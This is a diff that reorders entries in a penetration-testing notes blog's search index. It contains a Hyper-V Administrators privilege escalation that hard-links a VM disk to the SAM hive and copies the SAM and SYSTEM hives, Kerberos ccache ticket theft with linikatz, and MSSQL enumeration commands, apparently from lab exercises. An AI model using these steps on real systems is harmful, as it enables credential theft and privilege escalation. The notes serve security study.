@@ -752,48 +752,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Hyper-V Administrators</title>
-    <url>/2026/03/06/Hyper-V-Administrators/</url>
-    <content><![CDATA[<blockquote>
-<p>➜ The <code>Hyper-V Administrators</code> group has full access to all <a href="https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines">Hyper-V features</a>. If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins. They could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain.</p>
-</blockquote>
-<blockquote>
-<p>➜ The <code>Hyper-V Administrators</code> group can manage virtual machines and their disk files (<code>.vhdx</code>). The Hyper-V service (<code>vmms.exe</code>), running as <code>NT AUTHORITY\SYSTEM</code>, automatically restores default permissions on these disk files during cleanup. An attacker can delete a legitimate <code>.vhdx</code> file and replace it with a hard link to a protected system file such as <code>SAM</code>. When <code>vmms.exe</code> restores permissions, it grants <code>Hyper-V Administrators</code> full control over the target file, allowing credential extraction and privilege escalation to SYSTEM.</p>
-</blockquote>
-<h3 id="Initial-State"><a href="#Initial-State" class="headerlink" title="Initial State"></a>Initial State</h3><p>Our target file is:</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">K:\Twistzz\dc01.vhdx</span><br></pre></td></tr></table></figure>
-
-<p>We are members of:</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Hyper-V Administrators</span><br></pre></td></tr></table></figure>
-
-<p>However, we do not have direct access to protected files such as:</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\config\SAM</span><br></pre></td></tr></table></figure>
-<h3 id="Remove-the-Legitimate-Virtual-Disk"><a href="#Remove-the-Legitimate-Virtual-Disk" class="headerlink" title="Remove the Legitimate Virtual Disk"></a>Remove the Legitimate Virtual Disk</h3><p>Because members of <code>Hyper-V Administrators</code> have full control over VM disks, we can delete the original <code>.vhdx</code> file:</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">del</span> K:\Twistzz\dc01.vhdx</span><br></pre></td></tr></table></figure>
-
-<h3 id="Create-a-Hard-Link-to-a-Protected-File"><a href="#Create-a-Hard-Link-to-a-Protected-File" class="headerlink" title="Create a Hard Link to a Protected File"></a>Create a Hard Link to a Protected File</h3><p>Next, we create a hard link using the same file name as the virtual disk <code>dc01.vhdx</code>, pointing to the <code>SAM</code> registry hive:</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">fsutil hardlink create K:\Twistzz\dc01.vhdx C:\Windows\System32\config\SAM</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>At the filesystem level, both paths now reference the same file object.</p>
-</li>
-<li><p>Importantly, the <code>SAM</code> file permissions remain unchanged at this stage.</p>
-</li>
-</ul>
-<h3 id="Trigger-Permission-Restoration-by-Deleting-the-VM"><a href="#Trigger-Permission-Restoration-by-Deleting-the-VM" class="headerlink" title="Trigger Permission Restoration by Deleting the VM"></a>Trigger Permission Restoration by Deleting the VM</h3><p>When the virtual machine is deleted, <code>vmms.exe</code> restores permissions on <code>K:\Twistzz\dc01.vhdx</code>.</p>
-<p>Since <code>K:\Twistzz\dc01.vhdx</code> is a hard link to the <code>SAM</code> hive, any permission changes applied to this file also affect the <code>SAM</code> file.</p>
-<p>Because this operation is performed by <code>SYSTEM</code>, <code>vmms.exe</code> grants Full Control on <code>K:\Twistzz\dc01.vhdx</code> to members of <code>Hyper-V Administrators</code>, which effectively grants the same permissions on the <code>SAM</code> hive.</p>
-<h3 id="Access-the-Protected-System-File"><a href="#Access-the-Protected-System-File" class="headerlink" title="Access the Protected System File"></a>Access the Protected System File</h3><p>As members of <code>Hyper-V Administrators</code>, we now have sufficient permissions to access the <code>SAM</code> and <code>SYSTEM</code> registry hives</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> C:\Windows\System32\config\SAM C:\Temp\SAM_copy</span><br><span class="line"></span><br><span class="line"><span class="built_in">copy</span> C:\Windows\System32\config\SYSTEM C:\Temp\SYSTEM_copy</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Privesc</category>
-        <category>Groups</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Extracting Passwords from Windows Registry.</title>
     <url>/2025/11/25/Extracting-Passwords-from-Windows-Systems/</url>
     <content><![CDATA[<h2 id="Dump-SAM-SYSTEM-And-SECURITY"><a href="#Dump-SAM-SYSTEM-And-SECURITY" class="headerlink" title="Dump SAM, SYSTEM, And SECURITY"></a>Dump SAM, SYSTEM, And SECURITY</h2><h3 id="Offline"><a href="#Offline" class="headerlink" title="Offline"></a>Offline</h3><h4 id="Copy-Registry"><a href="#Copy-Registry" class="headerlink" title="Copy Registry"></a>Copy Registry</h4><p>Key Registry Hives:</p>
@@ -866,6 +824,48 @@
       <tags>
         <tag>impacket-GetNPUsers</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Hyper-V Administrators</title>
+    <url>/2026/03/06/Hyper-V-Administrators/</url>
+    <content><![CDATA[<blockquote>
+<p>➜ The <code>Hyper-V Administrators</code> group has full access to all <a href="https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines">Hyper-V features</a>. If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins. They could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain.</p>
+</blockquote>
+<blockquote>
+<p>➜ The <code>Hyper-V Administrators</code> group can manage virtual machines and their disk files (<code>.vhdx</code>). The Hyper-V service (<code>vmms.exe</code>), running as <code>NT AUTHORITY\SYSTEM</code>, automatically restores default permissions on these disk files during cleanup. An attacker can delete a legitimate <code>.vhdx</code> file and replace it with a hard link to a protected system file such as <code>SAM</code>. When <code>vmms.exe</code> restores permissions, it grants <code>Hyper-V Administrators</code> full control over the target file, allowing credential extraction and privilege escalation to SYSTEM.</p>
+</blockquote>
+<h3 id="Initial-State"><a href="#Initial-State" class="headerlink" title="Initial State"></a>Initial State</h3><p>Our target file is:</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">K:\Twistzz\dc01.vhdx</span><br></pre></td></tr></table></figure>
+
+<p>We are members of:</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Hyper-V Administrators</span><br></pre></td></tr></table></figure>
+
+<p>However, we do not have direct access to protected files such as:</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\config\SAM</span><br></pre></td></tr></table></figure>
+<h3 id="Remove-the-Legitimate-Virtual-Disk"><a href="#Remove-the-Legitimate-Virtual-Disk" class="headerlink" title="Remove the Legitimate Virtual Disk"></a>Remove the Legitimate Virtual Disk</h3><p>Because members of <code>Hyper-V Administrators</code> have full control over VM disks, we can delete the original <code>.vhdx</code> file:</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">del</span> K:\Twistzz\dc01.vhdx</span><br></pre></td></tr></table></figure>
+
+<h3 id="Create-a-Hard-Link-to-a-Protected-File"><a href="#Create-a-Hard-Link-to-a-Protected-File" class="headerlink" title="Create a Hard Link to a Protected File"></a>Create a Hard Link to a Protected File</h3><p>Next, we create a hard link using the same file name as the virtual disk <code>dc01.vhdx</code>, pointing to the <code>SAM</code> registry hive:</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">fsutil hardlink create K:\Twistzz\dc01.vhdx C:\Windows\System32\config\SAM</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>At the filesystem level, both paths now reference the same file object.</p>
+</li>
+<li><p>Importantly, the <code>SAM</code> file permissions remain unchanged at this stage.</p>
+</li>
+</ul>
+<h3 id="Trigger-Permission-Restoration-by-Deleting-the-VM"><a href="#Trigger-Permission-Restoration-by-Deleting-the-VM" class="headerlink" title="Trigger Permission Restoration by Deleting the VM"></a>Trigger Permission Restoration by Deleting the VM</h3><p>When the virtual machine is deleted, <code>vmms.exe</code> restores permissions on <code>K:\Twistzz\dc01.vhdx</code>.</p>
+<p>Since <code>K:\Twistzz\dc01.vhdx</code> is a hard link to the <code>SAM</code> hive, any permission changes applied to this file also affect the <code>SAM</code> file.</p>
+<p>Because this operation is performed by <code>SYSTEM</code>, <code>vmms.exe</code> grants Full Control on <code>K:\Twistzz\dc01.vhdx</code> to members of <code>Hyper-V Administrators</code>, which effectively grants the same permissions on the <code>SAM</code> hive.</p>
+<h3 id="Access-the-Protected-System-File"><a href="#Access-the-Protected-System-File" class="headerlink" title="Access the Protected System File"></a>Access the Protected System File</h3><p>As members of <code>Hyper-V Administrators</code>, we now have sufficient permissions to access the <code>SAM</code> and <code>SYSTEM</code> registry hives</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> C:\Windows\System32\config\SAM C:\Temp\SAM_copy</span><br><span class="line"></span><br><span class="line"><span class="built_in">copy</span> C:\Windows\System32\config\SYSTEM C:\Temp\SYSTEM_copy</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Privesc</category>
+        <category>Groups</category>
+      </categories>
   </entry>
   <entry>
     <title>Linux Credential Hunting</title>
@@ -1009,6 +1009,61 @@
       </tags>
   </entry>
   <entry>
+    <title>Mssql Enumeration</title>
+    <url>/2025/11/20/Mssql-Enumeration/</url>
+    <content><![CDATA[<h1 id="Connect-To-The-Data-Base"><a href="#Connect-To-The-Data-Base" class="headerlink" title="Connect To The Data Base"></a>Connect To The Data Base</h1><h2 id="SQL-Authentication"><a href="#SQL-Authentication" class="headerlink" title="SQL Authentication"></a>SQL Authentication</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h5 id="sqlcmd"><a href="#sqlcmd" class="headerlink" title="sqlcmd"></a>sqlcmd</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sqlcmd -S target -U username -P &#x27;password&#x27; -y <span class="number">30</span> -Y <span class="number">30</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh"><a href="#sqsh" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+
+<h5 id="mssqlclient"><a href="#mssqlclient" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Windows-Authentication-Local-Account"><a href="#Windows-Authentication-Local-Account" class="headerlink" title="Windows Authentication (Local Account)"></a>Windows Authentication (Local Account)</h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-1"><a href="#sqsh-1" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U .\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U HOSTNAME\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="mssqlclient-1"><a href="#mssqlclient-1" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target -windows-auth</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Domain-Authentication-With-DC"><a href="#Domain-Authentication-With-DC" class="headerlink" title="Domain Authentication (With DC)"></a>Domain Authentication (With DC)</h2><h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-2"><a href="#sqsh-2" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U domain\username -P password</span><br></pre></td></tr></table></figure>
+
+<h5 id="mssqlclient-2"><a href="#mssqlclient-2" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient domain/username:password@target</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Enumerate-Data-Base"><a href="#Enumerate-Data-Base" class="headerlink" title="Enumerate Data Base"></a>Enumerate Data Base</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h3 id="sqlcmd-1"><a href="#sqlcmd-1" class="headerlink" title="sqlcmd"></a>sqlcmd</h3><p>When using <code>sqlcmd</code>, each query must be followed by <code>GO</code> to trigger its execution.</p>
+<h5 id="List-Databases"><a href="#List-Databases" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> name FROM master.dbo.sysdatabases</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+
+<h5 id="Select-Database"><a href="#Select-Database" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; USE htbusers</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+
+<h5 id="List-Tables"><a href="#List-Tables" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> table_name FROM htbusers.INFORMATION_SCHEMA.TABLES</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+
+<h5 id="Dump-Specific-Table"><a href="#Dump-Specific-Table" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> * FROM users</span><br><span class="line"><span class="number">2</span>&gt; go</span><br></pre></td></tr></table></figure>
+
+<h2 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Mssqlclient"><a href="#Mssqlclient" class="headerlink" title="Mssqlclient"></a>Mssqlclient</h3><h5 id="List-Databases-1"><a href="#List-Databases-1" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; SELECT name FROM sys.databases;</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="Select-Database-1"><a href="#Select-Database-1" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; use database-name</span><br></pre></td></tr></table></figure>
+
+<h5 id="List-Tables-1"><a href="#List-Tables-1" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE=<span class="string">&#x27;BASE TABLE&#x27;</span> ORDER BY TABLE_SCHEMA, TABLE_NAME;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Dump-Specific-Table-1"><a href="#Dump-Specific-Table-1" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM table-name;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Enumeration</category>
+        <category>Service-Enumeration</category>
+        <category>MSSQL</category>
+      </categories>
+      <tags>
+        <tag>Enumeration</tag>
+        <tag>MSSQL</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Mssql Exploitation</title>
     <url>/2025/11/20/Mssql-Exploitation/</url>
     <content><![CDATA[<h1 id="Execute-Commands"><a href="#Execute-Commands" class="headerlink" title="Execute Commands"></a>Execute Commands</h1><h4 id="Run-Commands"><a href="#Run-Commands" class="headerlink" title="Run Commands"></a>Run Commands</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">xp_cmdshell <span class="string">&#x27;whoami&#x27;</span>;</span></span><br><span class="line"></span><br><span class="line">output</span><br><span class="line">-----------------------------</span><br><span class="line">no service\mssql$sqlexpress</span><br><span class="line">NULL</span><br><span class="line">(2 rows affected)</span><br></pre></td></tr></table></figure>
@@ -1084,61 +1139,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Mssql Enumeration</title>
-    <url>/2025/11/20/Mssql-Enumeration/</url>
-    <content><![CDATA[<h1 id="Connect-To-The-Data-Base"><a href="#Connect-To-The-Data-Base" class="headerlink" title="Connect To The Data Base"></a>Connect To The Data Base</h1><h2 id="SQL-Authentication"><a href="#SQL-Authentication" class="headerlink" title="SQL Authentication"></a>SQL Authentication</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h5 id="sqlcmd"><a href="#sqlcmd" class="headerlink" title="sqlcmd"></a>sqlcmd</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sqlcmd -S target -U username -P &#x27;password&#x27; -y <span class="number">30</span> -Y <span class="number">30</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh"><a href="#sqsh" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
-
-<h5 id="mssqlclient"><a href="#mssqlclient" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="Windows-Authentication-Local-Account"><a href="#Windows-Authentication-Local-Account" class="headerlink" title="Windows Authentication (Local Account)"></a>Windows Authentication (Local Account)</h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-1"><a href="#sqsh-1" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U .\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U HOSTNAME\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
-
-
-<h5 id="mssqlclient-1"><a href="#mssqlclient-1" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target -windows-auth</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Domain-Authentication-With-DC"><a href="#Domain-Authentication-With-DC" class="headerlink" title="Domain Authentication (With DC)"></a>Domain Authentication (With DC)</h2><h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-2"><a href="#sqsh-2" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U domain\username -P password</span><br></pre></td></tr></table></figure>
-
-<h5 id="mssqlclient-2"><a href="#mssqlclient-2" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient domain/username:password@target</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Enumerate-Data-Base"><a href="#Enumerate-Data-Base" class="headerlink" title="Enumerate Data Base"></a>Enumerate Data Base</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h3 id="sqlcmd-1"><a href="#sqlcmd-1" class="headerlink" title="sqlcmd"></a>sqlcmd</h3><p>When using <code>sqlcmd</code>, each query must be followed by <code>GO</code> to trigger its execution.</p>
-<h5 id="List-Databases"><a href="#List-Databases" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> name FROM master.dbo.sysdatabases</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
-
-<h5 id="Select-Database"><a href="#Select-Database" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; USE htbusers</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
-
-<h5 id="List-Tables"><a href="#List-Tables" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> table_name FROM htbusers.INFORMATION_SCHEMA.TABLES</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
-
-<h5 id="Dump-Specific-Table"><a href="#Dump-Specific-Table" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> * FROM users</span><br><span class="line"><span class="number">2</span>&gt; go</span><br></pre></td></tr></table></figure>
-
-<h2 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Mssqlclient"><a href="#Mssqlclient" class="headerlink" title="Mssqlclient"></a>Mssqlclient</h3><h5 id="List-Databases-1"><a href="#List-Databases-1" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; SELECT name FROM sys.databases;</span><br></pre></td></tr></table></figure>
-
-
-<h5 id="Select-Database-1"><a href="#Select-Database-1" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; use database-name</span><br></pre></td></tr></table></figure>
-
-<h5 id="List-Tables-1"><a href="#List-Tables-1" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE=<span class="string">&#x27;BASE TABLE&#x27;</span> ORDER BY TABLE_SCHEMA, TABLE_NAME;</span><br></pre></td></tr></table></figure>
-
-<h5 id="Dump-Specific-Table-1"><a href="#Dump-Specific-Table-1" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM table-name;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Enumeration</category>
-        <category>Service-Enumeration</category>
-        <category>MSSQL</category>
-      </categories>
-      <tags>
-        <tag>Enumeration</tag>
-        <tag>MSSQL</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>MySQL Enumeration</title>
     <url>/2025/11/21/MySQL-Enumeration/</url>
     <content><![CDATA[<h1 id="Connect-To-The-Server"><a href="#Connect-To-The-Server" class="headerlink" title="Connect To The Server"></a>Connect To The Server</h1><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u username -p&lt;password&gt; -h target</span><br></pre></td></tr></table></figure>
@@ -1180,6 +1180,38 @@
       </tags>
   </entry>
   <entry>
+    <title>PTT : Abusing KeyTab ccache</title>
+    <url>/2025/11/29/PTT-Abusing-KeyTab-ccache/</url>
+    <content><![CDATA[<h1 id="Finding-ccache-files"><a href="#Finding-ccache-files" class="headerlink" title="Finding ccache files"></a>Finding ccache files</h1><h4 id="Reviewing-environment-variables-for-ccache-files"><a href="#Reviewing-environment-variables-for-ccache-files" class="headerlink" title="Reviewing environment variables for ccache files."></a>Reviewing environment variables for ccache files.</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">env</span> | grep -i krb5</span><br><span class="line"></span><br><span class="line">KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh</span><br></pre></td></tr></table></figure>
+
+<h4 id="Searching-for-ccache-files-in-tmp"><a href="#Searching-for-ccache-files-in-tmp" class="headerlink" title="Searching for ccache files in &#x2F;tmp"></a>Searching for ccache files in &#x2F;tmp</h4><p><code>➜ if we gain access as root or a privileged user, we would be able to impersonate a user using their </code>ccache<code> file while it is still valid.</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /tmp</span><br><span class="line"></span><br><span class="line">-rw-------  1 julio@inlanefreight.htb  domain <span class="built_in">users</span>@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau</span><br><span class="line">-rw-------  1 david@inlanefreight.htb  domain <span class="built_in">users</span>@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d</span><br><span class="line">-rw-------  1 carlos@inlanefreight.htb domain <span class="built_in">users</span>@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Abusing-KeyTab-ccache"><a href="#Abusing-KeyTab-ccache" class="headerlink" title="Abusing KeyTab ccache"></a>Abusing KeyTab ccache</h1><h4 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h4><p><code>➜ Note: We need root access to impersonate a user using a ccache file, since ccache files are readable only by their owners.</code></p>
+<h4 id="Importing-the-ccache-file-into-our-current-session"><a href="#Importing-the-ccache-file-into-our-current-session" class="headerlink" title="Importing the ccache file into our current session"></a>Importing the ccache file into our current session</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=/tmp/root/krb5cc_647401106_I8I133</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">klist</span><br><span class="line"></span><br><span class="line">Ticket cache: FILE:/root/krb5cc_647401106_I8I133</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">        renew <span class="keyword">until</span> 10/08/2022 13:25:01</span><br></pre></td></tr></table></figure>
+
+<p>Example</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient //dc01/C$ -k -c <span class="built_in">ls</span> -no-pass</span><br></pre></td></tr></table></figure>
+
+<h1 id="Automated-Harvesting-Of-Ccache-Files"><a href="#Automated-Harvesting-Of-Ccache-Files" class="headerlink" title="Automated Harvesting Of Ccache Files"></a>Automated Harvesting Of Ccache Files</h1><h2 id="Linikatz"><a href="#Linikatz" class="headerlink" title="Linikatz"></a>Linikatz</h2><p><code>➜ It requires root access and extracts credentials (including Kerberos tickets) from services like FreeIPA, SSSD, Samba, and others.</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[!bash!]$ /opt/linikatz.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">    renew <span class="keyword">until</span> 10/11/2022 19:48:03, Flags: RIA</span><br><span class="line">    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: </span><br><span class="line">I: [kerberos-check] User Kerberos tickets</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Linux</category>
+        <category>Post Exploitation</category>
+        <category>Pass the Ticket (Ptt)</category>
+        <category>KeyTab Ccache Abuse</category>
+      </categories>
+      <tags>
+        <tag>klist</tag>
+        <tag>ccache</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>MySQL Exploitation</title>
     <url>/2025/11/21/MySQL-Exploitation/</url>
     <content><![CDATA[<h1 id="Secure-File-Privileges"><a href="#Secure-File-Privileges" class="headerlink" title="Secure File Privileges"></a>Secure File Privileges</h1><p><code>secure_file_priv</code> in <strong>MySQL</strong> controls where you can read&#x2F;write files.</p>
@@ -1217,38 +1249,6 @@
         <tag>Exploitation</tag>
         <tag>MySQL-Read-Files</tag>
         <tag>MySQL-Write-Files</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PTT : Abusing KeyTab ccache</title>
-    <url>/2025/11/29/PTT-Abusing-KeyTab-ccache/</url>
